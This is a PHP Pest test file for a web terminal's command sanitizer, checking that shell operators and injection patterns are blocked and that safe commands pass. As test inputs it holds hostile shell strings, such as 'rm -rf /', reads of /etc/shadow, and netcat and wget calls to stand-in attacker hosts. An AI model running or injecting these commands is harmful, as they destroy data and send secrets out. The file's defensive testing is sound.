<?php

declare(strict_types=1);

use MWGuerra\WebTerminal\Exceptions\ValidationException;
use MWGuerra\WebTerminal\Security\CommandSanitizer;

describe('CommandSanitizer', function () {
    describe('blocked characters', function () {
        it('blocks semicolon for command chaining', function () {
            $sanitizer = new CommandSanitizer;

            expect(fn () => $sanitizer->sanitize('ls; rm -rf /'))
                ->toThrow(ValidationException::class);
        });

        it('blocks pipe for output redirection', function () {
            $sanitizer = new CommandSanitizer;

            expect(fn () => $sanitizer->sanitize('cat /etc/passwd | grep root'))
                ->toThrow(ValidationException::class);
        });

        it('blocks ampersand for background execution', function () {
            $sanitizer = new CommandSanitizer;

            expect(fn () => $sanitizer->sanitize('sleep 10 &'))
                ->toThrow(ValidationException::class);
        });

        it('blocks dollar sign for variable expansion', function () {
            $sanitizer = new CommandSanitizer;

            expect(fn () => $sanitizer->sanitize('echo $HOME'))
                ->toThrow(ValidationException::class);
        });

        it('blocks backticks for command substitution', function () {
            $sanitizer = new CommandSanitizer;

            expect(fn () => $sanitizer->sanitize('echo `whoami`'))
                ->toThrow(ValidationException::class);
        });

        it('blocks newlines for command injection', function () {
            $sanitizer = new CommandSanitizer;

            expect(fn () => $sanitizer->sanitize("echo hello\nrm -rf /"))
                ->toThrow(ValidationException::class);
        });

        it('blocks carriage returns', function () {
            $sanitizer = new CommandSanitizer;

            expect(fn () => $sanitizer->sanitize("echo hello\rrm -rf /"))
                ->toThrow(ValidationException::class);
        });

        it('blocks null bytes', function () {
            $sanitizer = new CommandSanitizer;

            expect(fn () => $sanitizer->sanitize("echo hello\x00malicious"))
                ->toThrow(ValidationException::class);
        });

        it('allows clean commands', function () {
            $sanitizer = new CommandSanitizer;

            $result = $sanitizer->sanitize('ls -la /tmp');

            expect($result)->toBeString();
        });
    });

    describe('injection patterns', function () {
        it('detects $() command substitution', function () {
            $sanitizer = new CommandSanitizer;
            // Need to construct without $ to avoid blocked char check first
            $sanitizer->setBlockedCharacters([]);

            expect(fn () => $sanitizer->sanitize('echo $(whoami)'))
                ->toThrow(ValidationException::class, 'dangerous patterns');
        });

        it('detects ${} variable expansion', function () {
            $sanitizer = new CommandSanitizer;
            $sanitizer->setBlockedCharacters([]);

            expect(fn () => $sanitizer->sanitize('echo ${HOME}'))
                ->toThrow(ValidationException::class, 'dangerous patterns');
        });

        it('detects >> redirect append', function () {
            $sanitizer = new CommandSanitizer;

            expect(fn () => $sanitizer->sanitize('echo test >> /etc/passwd'))
                ->toThrow(ValidationException::class);
        });

        it('detects || or chaining', function () {
            $sanitizer = new CommandSanitizer;
            $sanitizer->setBlockedCharacters([]);

            expect(fn () => $sanitizer->sanitize('false || rm -rf /'))
                ->toThrow(ValidationException::class, 'dangerous patterns');
        });

        it('detects && and chaining', function () {
            $sanitizer = new CommandSanitizer;
            $sanitizer->setBlockedCharacters([]);

            expect(fn () => $sanitizer->sanitize('true && rm -rf /'))
                ->toThrow(ValidationException::class, 'dangerous patterns');
        });

        it('detects here-doc attempts', function () {
            $sanitizer = new CommandSanitizer;

            expect(fn () => $sanitizer->sanitize('cat << EOF'))
                ->toThrow(ValidationException::class);
        });

        it('detects hex escape sequences', function () {
            $sanitizer = new CommandSanitizer;

            expect(fn () => $sanitizer->sanitize('echo \\x2f'))
                ->toThrow(ValidationException::class);
        });

        it('detects octal escape sequences', function () {
            $sanitizer = new CommandSanitizer;

            expect(fn () => $sanitizer->sanitize('echo \\057'))
                ->toThrow(ValidationException::class);
        });
    });

    describe('escapeCommand', function () {
        it('returns empty string for empty input', function () {
            $sanitizer = new CommandSanitizer;

            expect($sanitizer->escapeCommand(''))->toBe('');
        });

        it('preserves simple commands', function () {
            $sanitizer = new CommandSanitizer;

            expect($sanitizer->escapeCommand('ls'))->toBe('ls');
        });

        it('escapes arguments with spaces', function () {
            $sanitizer = new CommandSanitizer;

            $result = $sanitizer->escapeCommand('echo hello world');

            expect($result)->toContain("'hello'");
            expect($result)->toContain("'world'");
        });

        it('preserves flags', function () {
            $sanitizer = new CommandSanitizer;

            $result = $sanitizer->escapeCommand('ls -la /tmp');

            expect($result)->toContain("'-la'");
        });
    });

    describe('escapeArgument', function () {
        it('handles empty strings', function () {
            $sanitizer = new CommandSanitizer;

            expect($sanitizer->escapeArgument(''))->toBe("''");
        });

        it('escapes simple strings', function () {
            $sanitizer = new CommandSanitizer;

            expect($sanitizer->escapeArgument('hello'))->toBe("'hello'");
        });

        it('escapes strings with spaces', function () {
            $sanitizer = new CommandSanitizer;

            expect($sanitizer->escapeArgument('hello world'))->toBe("'hello world'");
        });

        it('escapes strings with special characters', function () {
            $sanitizer = new CommandSanitizer;

            // escapeshellarg handles single quotes specially
            $result = $sanitizer->escapeArgument("it's");

            expect($result)->toContain('it');
        });

        it('preserves already quoted strings', function () {
            $sanitizer = new CommandSanitizer;

            expect($sanitizer->escapeArgument("'already quoted'"))->toBe("'already quoted'");
        });
    });

    describe('sanitizeOrNull', function () {
        it('returns sanitized command for safe input', function () {
            $sanitizer = new CommandSanitizer;

            $result = $sanitizer->sanitizeOrNull('ls -la');

            expect($result)->not->toBeNull();
        });

        it('returns null for dangerous input', function () {
            $sanitizer = new CommandSanitizer;

            expect($sanitizer->sanitizeOrNull('ls; rm -rf /'))->toBeNull();
        });
    });

    describe('isSafe', function () {
        it('returns true for safe commands', function () {
            $sanitizer = new CommandSanitizer;

            expect($sanitizer->isSafe('ls -la'))->toBeTrue();
            expect($sanitizer->isSafe('pwd'))->toBeTrue();
            expect($sanitizer->isSafe('whoami'))->toBeTrue();
        });

        it('returns false for dangerous commands', function () {
            $sanitizer = new CommandSanitizer;

            expect($sanitizer->isSafe('ls; rm'))->toBeFalse();
            expect($sanitizer->isSafe('echo | cat'))->toBeFalse();
            expect($sanitizer->isSafe('cmd &'))->toBeFalse();
        });
    });

    describe('stripDangerous', function () {
        it('removes blocked characters', function () {
            $sanitizer = new CommandSanitizer;

            expect($sanitizer->stripDangerous('ls;pwd'))->toBe('lspwd');
            expect($sanitizer->stripDangerous('echo|cat'))->toBe('echocat');
        });

        it('removes injection patterns', function () {
            $sanitizer = new CommandSanitizer;
            $sanitizer->setBlockedCharacters([]);

            expect($sanitizer->stripDangerous('echo $(whoami)'))->not->toContain('$(');
        });

        it('preserves safe content', function () {
            $sanitizer = new CommandSanitizer;

            expect($sanitizer->stripDangerous('ls -la /tmp'))->toBe('ls -la /tmp');
        });
    });

    describe('configuration', function () {
        it('can set blocked characters', function () {
            $sanitizer = new CommandSanitizer;

            $sanitizer->setBlockedCharacters([';']);

            expect($sanitizer->getBlockedCharacters())->toBe([';']);
        });

        it('can add blocked characters', function () {
            $sanitizer = new CommandSanitizer([';']);

            $sanitizer->addBlockedCharacter('|');

            expect($sanitizer->getBlockedCharacters())->toContain(';');
            expect($sanitizer->getBlockedCharacters())->toContain('|');
        });

        it('does not add duplicate blocked characters', function () {
            $sanitizer = new CommandSanitizer([';']);

            $sanitizer->addBlockedCharacter(';');

            expect(count(array_filter(
                $sanitizer->getBlockedCharacters(),
                fn ($c) => $c === ';'
            )))->toBe(1);
        });

        it('can add injection patterns', function () {
            $sanitizer = new CommandSanitizer;
            $initialCount = count($sanitizer->getInjectionPatterns());

            $sanitizer->addInjectionPattern('/custom/');

            expect(count($sanitizer->getInjectionPatterns()))->toBe($initialCount + 1);
        });

        it('can enable/disable auto-escape', function () {
            $sanitizer = new CommandSanitizer;

            expect($sanitizer->isAutoEscapeEnabled())->toBeTrue();

            $sanitizer->setAutoEscape(false);

            expect($sanitizer->isAutoEscapeEnabled())->toBeFalse();
        });

        it('returns original command when auto-escape is disabled', function () {
            $sanitizer = new CommandSanitizer;
            $sanitizer->setAutoEscape(false);

            $result = $sanitizer->sanitize('ls -la');

            expect($result)->toBe('ls -la');
        });
    });

    describe('real-world injection vectors', function () {
        it('blocks common injection attempts', function () {
            $sanitizer = new CommandSanitizer;

            $injectionAttempts = [
                'ls; cat /etc/passwd',
                'ls | nc attacker.com 1234',
                'echo $(cat /etc/shadow)',
                'ping localhost & wget evil.com',
                "ls\nrm -rf /",
                'echo `id`',
                'cat file; rm -rf /',
                'echo $PATH',
                'cmd1 && cmd2',
                'cmd1 || cmd2',
            ];

            foreach ($injectionAttempts as $attempt) {
                expect($sanitizer->isSafe($attempt))->toBeFalse(
                    "Expected '$attempt' to be blocked"
                );
            }
        });

        it('allows legitimate commands', function () {
            $sanitizer = new CommandSanitizer;

            $legitimateCommands = [
                'ls -la',
                'ls -la /var/log',
                'cat /etc/hosts',
                'grep root /etc/passwd',
                'ps aux',
                'df -h',
                'free -m',
                'whoami',
                'pwd',
                'uptime',
            ];

            foreach ($legitimateCommands as $command) {
                expect($sanitizer->isSafe($command))->toBeTrue(
                    "Expected '$command' to be allowed"
                );
            }
        });
    });

    describe('shell operator controls', function () {
        describe('allowPipes', function () {
            it('blocks pipes by default', function () {
                $sanitizer = new CommandSanitizer;

                expect($sanitizer->isSafe('ls | grep foo'))->toBeFalse();
            });

            it('allows pipes when enabled', function () {
                $sanitizer = (new CommandSanitizer)->allowPipes();

                expect($sanitizer->isSafe('ls | grep foo'))->toBeTrue();
            });

            it('still blocks other operators when pipes allowed', function () {
                $sanitizer = (new CommandSanitizer)->allowPipes();

                expect($sanitizer->isSafe('ls; rm -rf /'))->toBeFalse();
                expect($sanitizer->isSafe('echo $HOME'))->toBeFalse();
                expect($sanitizer->isSafe('echo `id`'))->toBeFalse();
            });
        });

        describe('allowRedirection', function () {
            it('blocks redirection by default', function () {
                $sanitizer = new CommandSanitizer;

                expect($sanitizer->isSafe('echo test >> /tmp/file'))->toBeFalse();
                expect($sanitizer->isSafe('cat << EOF'))->toBeFalse();
            });

            it('allows redirection operators when enabled', function () {
                $sanitizer = (new CommandSanitizer)->allowRedirection();
                $sanitizer->setAutoEscape(false);

                expect($sanitizer->isSafe('echo test >> /tmp/file'))->toBeTrue();
                expect($sanitizer->isSafe('cat << EOF'))->toBeTrue();
                expect($sanitizer->isSafe('echo test > /tmp/file'))->toBeTrue();
                expect($sanitizer->isSafe('cat < /tmp/file'))->toBeTrue();
            });

            it('still blocks other operators when redirection allowed', function () {
                $sanitizer = (new CommandSanitizer)->allowRedirection();

                expect($sanitizer->isSafe('ls | grep foo'))->toBeFalse();
                expect($sanitizer->isSafe('echo $HOME'))->toBeFalse();
            });
        });

        describe('allowChaining', function () {
            it('blocks chaining by default', function () {
                $sanitizer = new CommandSanitizer;

                expect($sanitizer->isSafe('ls; pwd'))->toBeFalse();
                expect($sanitizer->isSafe('sleep 10 &'))->toBeFalse();
            });

            it('allows chaining operators when enabled', function () {
                $sanitizer = (new CommandSanitizer)->allowChaining();
                $sanitizer->setAutoEscape(false);

                expect($sanitizer->isSafe('ls; pwd'))->toBeTrue();
                expect($sanitizer->isSafe('true && echo yes'))->toBeTrue();
                expect($sanitizer->isSafe('sleep 1 &'))->toBeTrue();
            });

            it('allows || when both chaining and pipes are enabled', function () {
                $sanitizer = (new CommandSanitizer)->allowChaining()->allowPipes();
                $sanitizer->setAutoEscape(false);

                expect($sanitizer->isSafe('false || echo no'))->toBeTrue();
            });

            it('still blocks other operators when chaining allowed', function () {
                $sanitizer = (new CommandSanitizer)->allowChaining();

                expect($sanitizer->isSafe('ls | grep foo'))->toBeFalse();
                expect($sanitizer->isSafe('echo $HOME'))->toBeFalse();
            });
        });

        describe('allowExpansion', function () {
            it('blocks expansion by default', function () {
                $sanitizer = new CommandSanitizer;

                expect($sanitizer->isSafe('echo $HOME'))->toBeFalse();
                expect($sanitizer->isSafe('echo `whoami`'))->toBeFalse();
            });

            it('allows expansion operators when enabled', function () {
                $sanitizer = (new CommandSanitizer)->allowExpansion();
                $sanitizer->setAutoEscape(false);

                expect($sanitizer->isSafe('echo $HOME'))->toBeTrue();
                expect($sanitizer->isSafe('echo `whoami`'))->toBeTrue();
                expect($sanitizer->isSafe('echo $(whoami)'))->toBeTrue();
                expect($sanitizer->isSafe('echo ${HOME}'))->toBeTrue();
            });

            it('still blocks other operators when expansion allowed', function () {
                $sanitizer = (new CommandSanitizer)->allowExpansion();

                expect($sanitizer->isSafe('ls | grep foo'))->toBeFalse();
                expect($sanitizer->isSafe('ls; pwd'))->toBeFalse();
            });
        });

        describe('allowAllShellOperators', function () {
            it('allows all operator groups', function () {
                $sanitizer = (new CommandSanitizer)->allowAllShellOperators();
                $sanitizer->setAutoEscape(false);

                expect($sanitizer->isSafe('ls | grep foo'))->toBeTrue();
                expect($sanitizer->isSafe('echo test >> /tmp/file'))->toBeTrue();
                expect($sanitizer->isSafe('ls; pwd'))->toBeTrue();
                expect($sanitizer->isSafe('true && echo yes'))->toBeTrue();
                expect($sanitizer->isSafe('echo $HOME'))->toBeTrue();
                expect($sanitizer->isSafe('echo `whoami`'))->toBeTrue();
            });

            it('still blocks null bytes even when all operators allowed', function () {
                $sanitizer = (new CommandSanitizer)->allowAllShellOperators();

                expect($sanitizer->isSafe("echo hello\x00malicious"))->toBeFalse();
            });

            it('still blocks newlines even when all operators allowed', function () {
                $sanitizer = (new CommandSanitizer)->allowAllShellOperators();

                expect($sanitizer->isSafe("echo hello\nrm -rf /"))->toBeFalse();
            });

            it('still blocks carriage returns even when all operators allowed', function () {
                $sanitizer = (new CommandSanitizer)->allowAllShellOperators();

                expect($sanitizer->isSafe("echo hello\rrm -rf /"))->toBeFalse();
            });
        });

        describe('combining groups', function () {
            it('allows pipes and redirection together', function () {
                $sanitizer = (new CommandSanitizer)->allowPipes()->allowRedirection();
                $sanitizer->setAutoEscape(false);

                expect($sanitizer->isSafe('ls | grep foo'))->toBeTrue();
                expect($sanitizer->isSafe('echo test >> /tmp/file'))->toBeTrue();
                expect($sanitizer->isSafe('ls; pwd'))->toBeFalse();
                expect($sanitizer->isSafe('echo $HOME'))->toBeFalse();
            });

            it('allows pipes and chaining together', function () {
                $sanitizer = (new CommandSanitizer)->allowPipes()->allowChaining();
                $sanitizer->setAutoEscape(false);

                expect($sanitizer->isSafe('ls | grep foo'))->toBeTrue();
                expect($sanitizer->isSafe('ls; pwd'))->toBeTrue();
                expect($sanitizer->isSafe('true && echo yes'))->toBeTrue();
                expect($sanitizer->isSafe('echo $HOME'))->toBeFalse();
            });
        });

        describe('constructor flags', function () {
            it('accepts flags via constructor', function () {
                $sanitizer = new CommandSanitizer(
                    allowPipes: true,
                    allowChaining: true,
                );
                $sanitizer->setAutoEscape(false);

                expect($sanitizer->isSafe('ls | grep foo'))->toBeTrue();
                expect($sanitizer->isSafe('ls; pwd'))->toBeTrue();
                expect($sanitizer->isSafe('echo $HOME'))->toBeFalse();
            });
        });
    });

    describe('edge cases', function () {
        it('handles unicode characters', function () {
            $sanitizer = new CommandSanitizer;

            expect($sanitizer->isSafe('echo "Hello 世界"'))->toBeTrue();
        });

        it('handles paths with spaces', function () {
            $sanitizer = new CommandSanitizer;

            $result = $sanitizer->sanitize('ls "/path with spaces/file"');

            expect($result)->toContain('/path with spaces/file');
        });

        it('handles multiple consecutive spaces', function () {
            $sanitizer = new CommandSanitizer;

            $result = $sanitizer->sanitize('ls   -la   /tmp');

            expect($result)->toBeString();
        });

        it('handles quoted strings with special chars inside', function () {
            $sanitizer = new CommandSanitizer;

            // Quotes containing normally-blocked characters should still be blocked
            // because we check the raw input first
            expect($sanitizer->isSafe('echo "hello;world"'))->toBeFalse();
        });
    });
});
